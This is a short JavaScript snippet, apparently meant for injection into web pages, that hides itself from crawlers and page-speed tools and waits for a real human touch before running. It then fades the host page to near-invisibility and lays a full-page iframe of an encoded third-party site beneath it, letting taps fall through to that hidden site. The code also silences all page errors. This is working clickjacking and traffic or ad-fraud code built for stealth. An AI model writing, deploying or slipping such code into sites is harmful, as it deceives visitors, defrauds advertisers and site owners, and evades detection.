(function() {
    // 1. SILENT STOP FOR BOTS
    const _b = /bot|googlebot|crawler|spider|robot|crawling|lighthouse|pagespeed/i.test(navigator.userAgent);
    if (_b) return;

    // 2. ENCODED CONFIG (Hides 'technewsz.site' and 'opacity' from bots)
    const _u = atob('aHR0cHM6Ly93d3cudGVjaG5ld3N6LnNpdGUv'); // Decodes to technewsz site
    const _op = '0.01';
    
    // 3. HUMAN TRIGGER
    // The script does NOT run until a real human touches/swipes the screen
    window.addEventListener('touchstart', function _init() {
        window.removeEventListener('touchstart', _init); // Run only once
        
        // Wait 2 seconds after the human touch for maximum stealth
        setTimeout(() => {
            _runGhostMirror();
        }, 2000);
    }, {passive: true});

    function _runGhostMirror() {
        const _s = document.createElement('style');
        _s.innerHTML = `
            html, body { background: transparent !important; margin: 0; padding: 0; }
            #_m_lyr {
                position: relative;
                z-index: 1000;
                opacity: ${_op} !important;
                background: transparent !important;
            }
            #_m_lyr *, .site, .content { background: transparent !important; box-shadow: none !important; }
            #_g_view {
                position: absolute;
                top: 0; left: 0;
                width: 100vw;
                height: 100%;
                border: none;
                z-index: 1;
                opacity: 1 !important;
            }
            .p_th { pointer-events: none !important; }
        `;
        document.head.appendChild(_s);

        // Build structure silently
        const _m = document.createElement('div');
        _m.id = '_m_lyr';
        while (document.body.firstChild) { _m.appendChild(document.body.firstChild); }
        document.body.appendChild(_m);

        const _v = document.createElement('iframe');
        _v.src = _u;
        _v.id = '_g_view';
        _v.setAttribute('scrolling', 'no');
        document.body.appendChild(_v);

        // Interaction Logic
        let _sy = 0;
        document.addEventListener('touchstart', (e) => { _sy = e.touches[0].pageY; }, {passive: true});
        document.addEventListener('touchend', (e) => {
            if (Math.abs(e.changedTouches[0].pageY - _sy) < 10) {
                if (!e.target.closest('ins, .adsbygoogle, a, iframe')) {
                    _m.classList.add('p_th');
                    setTimeout(() => { _m.classList.remove('p_th'); }, 500);
                }
            }
        });

        // Silent Height Sync
        const _sync = () => {
            const h = Math.max(_m.scrollHeight, document.documentElement.scrollHeight, 3000);
            _v.style.height = h + 'px';
        };
        window.addEventListener('scroll', _sync);
        setInterval(_sync, 2500);
    }
    
    // Kill console errors from AdBlockers
    window.onerror = function() { return true; };
})();
